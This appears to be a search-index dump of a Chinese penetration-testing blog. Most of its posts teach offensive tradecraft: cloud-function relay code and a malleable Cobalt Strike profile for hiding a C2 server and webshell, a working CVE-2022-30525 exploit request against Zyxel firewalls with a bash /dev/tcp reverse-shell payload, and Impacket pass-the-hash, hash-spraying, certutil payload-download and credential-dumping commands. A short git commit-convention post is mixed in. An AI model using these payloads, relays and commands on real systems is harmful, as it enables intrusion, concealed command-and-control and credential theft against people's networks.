Strike逃避IDS","uri":"/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AEcobalt-strike%E9%80%83%E9%81%BFids/"},{"categories":["渗透测试"],"content":"隐藏C2服务器的手法有很多，如： 域前置 CDN 第三方代理软件（heroku） 云函数 ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:0","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":"配置云函数 这里先介绍云函数了， 云函数的创建参考上一篇文章：http://www.xpshuai.cn/2022/06/13/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FWebshell%E7%9C%9F%E5%AE%9EIP/， 只是代码部分略有不同： # -*- coding: utf8 -*- import json,requests,base64 def main_handler(event, context): C2='http://\u003cC2服务器地址\u003e' # 这里可以使用 HTTP、HTTPS~下角标~ path=event['path'] headers=event['headers'] print(event) if event['httpMethod'] == 'GET' : resp=requests.get(C2+path,headers=headers,verify=False) else: resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False) print(resp.headers) print(resp.content) response={ \"isBase64Encoded\": True, \"statusCode\": resp.status_code, \"headers\": dict(resp.headers), \"body\": str(base64.b64encode(resp.content))[2:-1] } return response 点击API服务名： 点击编辑： 路径修改为/，点击下一步： 配置如下，点击完成： ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:1:0","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":"配置cs ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:2:0","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":"配置CS的profile文件 set sample_name \"kris_abao\"; set sleeptime \"3000\"; set jitter \"0\"; set maxdns \"255\"; set useragent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\"; https-certificate { set keystore \"cobaltStrike.store\"; //生成的cs证书名 set password \"123456\"; //自己设置的密码 ## Option 3) Cobalt Strike Self-Signed Certificate set C \"US\"; set CN \"jquery.com\"; set O \"jQuery\"; set OU \"Certificate Authority\"; set validity \"365\"; } http-get { set uri \"/api/getit\"; client { header \"Accept\" \"*/*\"; metadata { base64; prepend \"SESSIONID=\"; header \"Cookie\"; } } server { header \"Content-Type\" \"application/ocsp-response\"; header \"content-transfer-encoding\" \"binary\"; header \"Server\" \"Nodejs\"; output { base64; print; } } } http-stager { set uri_x86 \"/vue.min.js\"; set uri_x64 \"/bootstrap-2.min.js\"; } http-post { set uri \"/api/postit\"; client { header \"Accept\" \"*/*\"; id { base64; prepend \"JSESSION=\"; header \"Cookie\"; } output { base64; print; } } server { header \"Content-Type\" \"application/ocsp-response\"; header \"content-transfer-encoding\" \"binary\"; header \"Connection\" \"keep-alive\"; output { base64; print; } } } ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:2:1","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":"开启cs teamserver ./teamserver vpsip password c2.profile Note: 上线地址 需要去掉http://和:80 取service-miuk9icj-1309081727.bj.apigw.tencentcs.com ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:2:2","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":"创建监听 成功上线，可以看到外部IP第一栏是不断变化的，也就是隐藏了我们C2服务器 附： 删掉测试机器上的恶意exe： # 查找进程 tasklist /svc |findstr XXX.exe # 根据pid杀进程 taskkill /T /F /PID 9718 # 根据进程名杀进程 taskkill /f /t /im XXX.exe ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:2:3","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":"云函数隐藏C2原理 马er -\u003e 腾讯云函数api -\u003e py函数 -\u003e CS服务端 CS马被执行后，流量直接走向腾讯云的api（也就是这一步达成了隐藏C2服务端的目的，腾讯地址，有腾讯的CDN），然后py函数会根据传入的流量作为中间人对CS服务端进行请求，并获取返回结果后返回请求获取的数据信息（py代码的请求内容和CS服务端加载的profile是相对应的，CS服务端根据py函数传入的数据来获取相关信息） ","date":"2022-06-14","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/:3:0","tags":["渗透测试","防溯源","云函数","C2"],"title":"利用云函数隐藏C2服务器","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["渗透测试"],"content":" 腾讯云自带CDN，我们可以通过腾讯云函数来转发我们的Webshell请求，从而达到隐藏真实IP的目的 ","date":"2022-06-13","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/:0:0","tags":["渗透测试","防溯源","云函数"],"title":"利用云函数隐藏Webshell真实IP","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/"},{"categories":["渗透测试"],"content":"创建云函数 找到云函数，使用自定义模板 把下面的代码复制到index.py中 # -*- coding: utf8 -*- import requests import json def geturl(urlstr): jurlstr = json.dumps(urlstr) dict_url = json.loads(jurlstr) return dict_url['u'] def main_handler(event, context): url = geturl(event['queryString']) postdata = event['body'] headers=event['headers'] resp=requests.post(url,data=postdata,headers=headers,verify=False) response={ \"isBase64Encoded\": False, \"statusCode\": 200, \"headers\": {'Content-Type': 'text/html;charset='+resp.apparent_encoding}, \"body\": resp.text } return response 注意，运行环境要选Ppython3.6，不然3.7的话得手动上传第三方库(感觉我的同事，不然我一直在坑里出不来呢) 部署成功后，点击触发管理-\u003e创建触发器： 这里需要选择API网关触发： 创建完成后，下图可以看到我们的访问路径： ","date":"2022-06-13","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/:1:0","tags":["渗透测试","防溯源","云函数"],"title":"利用云函数隐藏Webshell真实IP","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/"},{"categories":["渗透测试"],"content":"使用方法 然后在我们的访问路径后面增加?u=webshell一句话木马的地址即可 例如： https://sxxxxxxxxxxxxxxxxx.gz.apigw.tencentcs.com/release/helloworld-11?u=http://xxxx/shell.jsp 使用云函数之前，可以看到我的真实IP： 我这里使用tail -f xxx.log来监控的日志，也可以wireshark抓包 访问：http://10.80.20.57:8080/test/shell.jsp 使用云函数之后， 访问：https://serxxxxxxxxxxxx.gz.apigw.tencentcs.com/release/forwarded?u=http://xxx/shell.jsp 然后我们查看日志：显示的是腾讯云函数CDN的地址 可以看到IP地址是随机的： 成功达到目的 ","date":"2022-06-13","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/:2:0","tags":["渗透测试","防溯源","云函数"],"title":"利用云函数隐藏Webshell真实IP","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/"},{"categories":["渗透测试"],"content":"补充 防止webshell的掉线行为，修改一下超时设置，可以配置为60s 最好在【函数管理】 -\u003e 【函数配置】里面，最好把执行超时时间设置成和蚁剑里面的超时时间一样或者更长 ","date":"2022-06-13","objectID":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/:3:0","tags":["渗透测试","防溯源","云函数"],"title":"利用云函数隐藏Webshell真实IP","uri":"/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fwebshell%E7%9C%9F%E5%AE%9Eip/"},{"categories":["渗透测试"],"content":"漏洞说明 ZyXEL USG FLEX 等都是中国台湾合勤（ZyXEL）公司的防火墙产品。2022年5月12日， Zyxel发布安全公告，修复了一个存在于部分防火墙版本的CGI程序中的命令注入漏洞。漏洞编号：CVE-2022-30525，漏洞威胁等级：严重，漏洞评分：9.8。 该漏洞存在于某些Zyxel防火墙版本的 CGI 程序中，允许在未经身份验证的情况下在受影响设备上以nobody用户身份执行任意命令。 ","date":"2022-05-13","objectID":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/:1:0","tags":["Zyxel","CVE-2022-30525","漏洞复现"],"title":"Zyxel 防火墙未经身份验证的远程命令注入(CVE-2022-30525)","uri":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/"},{"categories":["渗透测试"],"content":"影响范围 ATP系列固件：5.10-5.21 Patch 1 VPN系列固件：4.60-5.21 Patch 1 USG FLEX 100(W)、200、500、700：5.00-5.21 Patch 1 USG FLEX 50(W)/USG20(W)-VPN：5.10-5.21 Patch 1 ","date":"2022-05-13","objectID":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/:2:0","tags":["Zyxel","CVE-2022-30525","漏洞复现"],"title":"Zyxel 防火墙未经身份验证的远程命令注入(CVE-2022-30525)","uri":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/"},{"categories":["渗透测试"],"content":"漏洞复现 出现漏洞的文件为 lib_wan_settings.py 下的 setWanPortSt 方法，从源码里可以看到拼接的参数为 mtu , 随后直接 os.system 命令执行 手工验证： POC： 其中mtu参数后面为要执行的命令 POST /ztp/cgi-bin/handler HTTP/1.1 Host: host User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Content-Type: application/json Connection: close Content-Length: 165 {\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\" :\"1\",\"vlanid\":\"5\",\"mtu\":\"; ping {DNSlog};\",\"data\":\"hi\"} 反弹Shell: POST /ztp/cgi-bin/handler HTTP/1.1 Host: host User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Content-Type: application/json Connection: close Content-Length: 165 {\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\" :\"1\",\"vlanid\":\"5\",\"mtu\":\";bash -c 'exec bash -i \u0026\u003e/dev/tcp/xxx.xxx.xxx.xxx/9999 \u003c\u00261';\",\"data\":\"hi\"} 批量验证： 脚本地址：https://github.com/shuai06/CVE-2022-30525 ","date":"2022-05-13","objectID":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/:3:0","tags":["Zyxel","CVE-2022-30525","漏洞复现"],"title":"Zyxel 防火墙未经身份验证的远程命令注入(CVE-2022-30525)","uri":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/"},{"categories":["渗透测试"],"content":"修复建议 厂商已发布补丁修复漏洞，用户请尽快更新至安全版本：ZLD V5.30。 下载链接如下：https://www.zyxel.com/support/download_landing.shtml ","date":"2022-05-13","objectID":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/:4:0","tags":["Zyxel","CVE-2022-30525","漏洞复现"],"title":"Zyxel 防火墙未经身份验证的远程命令注入(CVE-2022-30525)","uri":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/"},{"categories":["渗透测试"],"content":"参考链接 https://mp.weixin.qq.com/s/du56JX1ft03Z-YtM2C2E8A ","date":"2022-05-13","objectID":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/:5:0","tags":["Zyxel","CVE-2022-30525","漏洞复现"],"title":"Zyxel 防火墙未经身份验证的远程命令注入(CVE-2022-30525)","uri":"/zyxel-%E9%98%B2%E7%81%AB%E5%A2%99%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-cve-2022-30525/"},{"categories":["办公"],"content":"简介 commit message 应该清晰明了，说明本次提交的目的。而且多人协作的时候，有问题也方便查看提交日志 目前使用最广的写法是Angular 规范(https://docs.google.com/document/d/1QrDFcIiPjSLDn3EL15IJygNPiHORgU1_OOAqWjiDU5Y/edit#heading=h.greljkmo14y0)，它比较合理和系统化，并且有配套的工具 ","date":"2022-05-10","objectID":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/:1:0","tags":["git","commit"],"title":"git commit 提交规范","uri":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/"},{"categories":["办公"],"content":"Commit message 作用 格式化的Commit message，有几个好处。 （1）提供更多的历史信息，方便快速浏览。 比如，显示每次发布后的变动，每个commit占据一行。你只看行首，就知道某次 commit 的目的。 （2）可以过滤某些commit（比如文档改动），便于快速查找信息。 比如，下面的命令仅仅显示本次发布新增加的功能。 git log \u003clast release\u003e HEAD --grep feature （3）可以直接从commit生成Change log。 Change Log 是发布新版本时，用来说明与上一个版本差异的文档。 ","date":"2022-05-10","objectID":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/:2:0","tags":["git","commit"],"title":"git commit 提交规范","uri":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/"},{"categories":["办公"],"content":"Commit message 的格式规范 每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。 \u003ctype\u003e(\u003cscope\u003e): \u003csubject\u003e // 空一行 \u003cbody\u003e // 空一行 \u003cfooter\u003e 其中，Header 是必需的，Body 和 Footer 可以省略。 一、Head：（一般简单项目只写head也够） 格式：type \u003cscope\u003e : subject 示例：feat(订单模块)：订单详情接口增加订单号字段 其中， feat对应type字段；订单模块对应scope(若果scope有内容，括号就存在)；“订单详情接口增加订单号字段”对应subject，简要说明此次代码变更的主要内容。 1、type（必须） 必须要填写，这是表明此次commit的类型，具体有一下几种类型： feat：新功能 fix：修复bug docs：文档改变 style：代码格式改变 refactor：重构某个功能 perf：性能优化 test：增加测试 build：构建项目，如替换了构建工具 revert：撤销上次的commit chore：构建过程或者辅助工具的变动 如果type为feat和fix，则该 commit 将肯定出现在 Change log 之中。其他情况（docs、chore、style、refactor、test）由你决定，要不要放入 Change log，建议是不要。 2、scope（可选）用于说明此次commit提交作用的范围，例如视图层，控制层，数据之久层，项目配置等等 3、subject（必须）主题必须填写，用于描述此次commit的内容，简单描述即可，例如如何重构某一项功能。 # subject 1.以动词开头，使用第一人称现在时，比如change，而不是changed或changes 2.第一个字母小写 3.结尾不加句号（.） 二、Body Body 部分是对本次 commit 的详细描述，可以分成多行，每行尽量不超过72个字符 三、Footer Footer 部分只用于两种情况。 1.不兼容变动 2.关闭Issue ","date":"2022-05-10","objectID":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/:3:0","tags":["git","commit"],"title":"git commit 提交规范","uri":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/"},{"categories":["办公"],"content":"Pycharm的Git Commit Template插件 ","date":"2022-05-10","objectID":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/:4:0","tags":["git","commit"],"title":"git commit 提交规范","uri":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/"},{"categories":["办公"],"content":"生成Change log 如果你的所有 Commit 都符合 Angular 格式，那么发布新版本时， Change log 就可以用脚本自动生成 …用的时候再来了解 ","date":"2022-05-10","objectID":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/:5:0","tags":["git","commit"],"title":"git commit 提交规范","uri":"/git-commit-%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83/"},{"categories":["渗透测试"],"content":"简介 Impacket是用于处理网络协议的Python类的集合。Impacket专注于提供对数据包的简单编程访问，以及协议实现本身的某些协议（例如SMB1-3和MSRPC）。数据包可以从头开始构建，也可以从原始数据中解析，而面向对象的API使处理协议的深层次结构变得简单。该库提供了一组工具，作为在此库找到可以执行的操作的示例。 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:1:0","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"安装 pip install impacket # 这只会安装这个库，但是不能安装使用的其他库和例子 首先我们要先去GitHub下载源码，或者直接使用 git clone https://github.com/CoreSecurity/impacket.git 然后解压缩，进入impacket cd impacket/ 然后运行 python setup.py install 工具都在这个目录里impacket/examples cd impacket/examples Docker： Build Impacket’s image: $ docker build -t \"impacket:latest\" . Using Impacket’s image: $ docker run -it --rm \"impacket:latest\" ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:2:0","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"包含的协议 以太网，Linux“Cooked”数据包捕获 IP，TCP，UDP，ICMP，IGMP，ARP 支持IPv4和IPv6 NMB和SMB1，SMB2和SMB3（高级实现） MSRPC版本5，通过不同的传输协议：TCP，SMB / TCP，SMB/NetBIOS和HTTP 使用密码/哈希/票据/密钥进行简单的NTLM和Kerberos身份验证 部分或完全实现以下MSRPC接口：EPM，DTYPES，LSAD，LSAT，NRPC，RRP，SAMR，SRVS，WKST，SCMR，BKRP，DHCPM，EVEN6，MGMT，SASEC，TSCH，DCOM，WMI 部分TDS（MSSQL）和LDAP协议实现。 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:3:0","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"包含的工具 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:0","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"远程执行 psexec.py:类似PSEXEC的功能示例，使用remcomsvc（https://github.com/kavika13/remcom）Psexec.py允许你在远程Windows系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程shell命令（不需要安装任何客户端软件）。 # 语法: ./psexec.py [[domain/] username [: password] @] [Target IP Address] ./psexec.py SERVER/Administrator: T00r@192.168.1.140 /psexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@172.16.99.146 ./psexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@192.168.124.136 -c /root/1.exe smbexec.py：与使用remcomsvc的psexec w/o类似的方法。这里描述了该技术。我们的实现更进一步，实例化本地smbserver以接收命令的输出。这在目标计算机没有可写共享可用的情况下很有用。 # smbexec ./smbexec.py test/administrator@192.168.23.99 -hashes aad3b435b51404eeaad3b435b51404ee:3dbde697d71690a769204beb12283678 #左面是lm-hash，右边是nt-hash，lmhash可以为空 ./smbexec.py -hashes :3dbde697d71690a769204beb12283678 test/administrator@192.168.23.99 ./smbexec.py test/administrator:123@192.168.23.99 atexec.py：此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。 ./atexec.py test/administrator:1234@192.168.124.136 “certutil -urlcache -split -f http://192.168.124.136/1.exe 2.exe” ./atexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@192.168.124.136 1.exe ## hash喷洒攻击 # 内网机器遍历做hash传递验证,ips.txt内容为内网ip，每段一条 FOR /F %i in (ips.txt) do atexec.exe -hashes :3dbde697d71690a769204beb12283678 ./administrator@%i whoami # 指定主机ntlm hash遍历验证，hashes.txt为已知ntlm hash内容，每段一条 #文件内部的hash格式应该为\":nthash\"或者\"lmhash:nthash\",如果只采用nthash切记加一个冒号\":\" FOR /F %i in (hashes.txt) do atexec.exe -hashes %i ./administrator@192.168.23.99 whoami # 内网机器遍历做密码验证，passwords.txt为已知密码内容，每段一条 FOR /F %i in (passwords.txt) do atexec.exe ./administrator:%i@192.168.23.99 whoami # 指定主机密码遍历验证,ips.txt内容为内网ip，每段一条 FOR /F %i in (ips.txt) do atexec.exe ./administrator:123@%i whoami wmiexec.py：通过Windows Management Instrumentation使用的半交互式shell，它不需要在目标服务器上安装任何服务/代理，以管理员身份运行，非常隐蔽。 # 语法: ./wmiexec.py [[domain/] username [: password] @] [Target IP Address] ./wmiexec.py SERVER/Administrator: T00r@192.168.1.140 ./wmiexec.py -hashes :7ce21f17c0aee7fb9ceba532d0546ad6 test/administrator@172.16.99.146 dcomexec.py：类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点。目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。 GetTGT.py：指定密码，哈希或aesKey，此脚本将请求TGT并将其保存为ccache GetST.py：指定ccache中的密码，哈希，aesKey或TGT，此脚本将请求服务票证并将其保存为ccache。如果该帐户具有约束委派（具有协议转换）权限，您将能够使用-impersonate参数代表另一个用户请求该票证。 python3 getST.py -dc-ip 172.24.1.99 -spn krbtgt/test.com@test.com test/zhujiayu:123 GetPac.py：此脚本将获得指定目标用户的PAC（权限属性证书）结构，该结构仅具有正常的经过身份验证的用户凭据。它通过混合使用[MS-SFU]的S4USelf +用户到用户Kerberos身份验证组合来实现的。 GetUserSPNs.py：此示例将尝试查找和获取与普通用户帐户关联的服务主体名称。 GetNPUsers.py：此示例将尝试为那些设置了属性“不需要Kerberos预身份验证”的用户获取TGT（UF_DONT_REQUIRE_PREAUTH).输出与JTR兼容 ticketer.py：此脚本将从头开始或基于模板（根据KDC的合法请求）创建金/银票据，允许您在PAC_LOGON_INFO结构中自定义设置的一些参数，特别是组、外接程序、持续时间等。 raiseChild.py：此脚本通过（ab）使用Golden Tickets和ExtraSids的基础来实现子域到林权限的升级。 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:1","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"Kerberos secretsdump.py：执行各种技术从远程机器转储Secrets，而不在那里执行任何代理。对于SAM和LSA Secrets（包括缓存的凭据），然后将hives保存在目标系统（％SYSTEMROOT％\\ Temp目录）中，并从中读取其余数据。对于DIT文件，我们使用dl_drsgetncchanges（）方法转储NTLM哈希值、纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec/wmiexec方法执行的vssadmin来转储NTDS.dit.如果脚本不可用，脚本将启动其运行所需的服务（例如，远程注册表，即使它已被禁用）。运行完成后，将恢复到原始状态。 mimikatz.py：用于控制@gentilkiwi开发的远程mimikatz RPC服务器的迷你shell ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:2","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"Windows密码 ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP服务器并将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些攻击可以在中继连接时触发（例如，通过LDAP创建用户），也可以在SOCKS模式下执行。在此模式下，对于每个中继的连接，稍后可以通过SOCKS代理多次使用它 karmaSMB.py：无论指定的SMB共享和路径名如何，都会响应特定文件内容的SMB服务器 smbserver.py:SMB服务器的Python实现，允许快速设置共享和用户帐户。 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:3","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"服务器工具/ MiTM攻击 ntlmrelayx.py：此脚本执行NTLM中继攻击，设置SMB和HTTP服务器并将凭据中继到许多不同的协议（SMB，HTTP，MSSQL，LDAP，IMAP，POP3等）。该脚本可以与预定义的攻击一起使用，这些攻击可以在中继连接时触发（例如，通过LDAP创建用户），也可以在SOCKS模式下执行。在此模式下，对于每个中继的连接，稍后可以通过SOCKS代理多次使用它 karmaSMB.py：无论指定的SMB共享和路径名如何，都会响应特定文件内容的SMB服务器 smbserver.py:SMB服务器的Python实现，允许快速设置共享和用户帐户。 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:4","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"WMI wmiquery.py：它允许发出WQL查询并在目标系统上获取WMI对象的描述（例如，从win32_account中选择名称） 